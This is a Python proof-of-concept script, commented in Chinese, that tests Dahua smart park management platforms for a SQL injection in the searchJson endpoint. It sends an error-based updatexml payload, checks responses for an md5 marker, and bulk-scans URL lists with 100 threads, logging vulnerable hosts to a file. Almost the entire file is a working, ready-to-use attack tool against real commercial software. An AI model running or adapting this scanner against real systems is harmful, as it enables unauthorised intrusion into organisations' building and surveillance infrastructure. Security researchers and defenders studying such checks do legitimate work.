#大华智慧园区综合管理平台 searchJson SQL注入漏洞
#导包外置
import requests,argparse,sys,re
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """██████  ██   ██         ███████  ██████  ██      
██   ██ ██   ██         ██      ██    ██ ██      
██   ██ ███████         ███████ ██    ██ ██      
██   ██ ██   ██              ██ ██ ▄▄ ██ ██      
██████  ██   ██ ███████ ███████  ██████  ███████ 
                                    ▀▀           
                                           author:CHKer
                                           version:1.0.0      
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='大华智慧园区综合管理平台 searchJson SQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select+md5%281%29),0x7e),1)--%22%7D/extend/%7B%7D'
    headers = {
        'Accept-Encoding':'gzip, deflate, br',
        'Connection':'close'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(url=target+payload,headers=headers,verify=False,timeout=10,proxies=proxies)
    # print(res1.text)
    except:
        pass
    try:
        match = re.findall(r"~c4ca4238a0b923820dcc509a6f75849",res1.text)
        if '~c4ca4238a0b923820dcc509a6f75849' in match[0]:
            with open('result2.txt','a',encoding='utf-8') as fp:
                fp.write(f'{target}'+'\n')
        else:
            print(f"[-]漏洞不存在{target}")
    except:
        print(f'[-]该url:{target}该站点存在问题')



if __name__ == '__main__':
    main()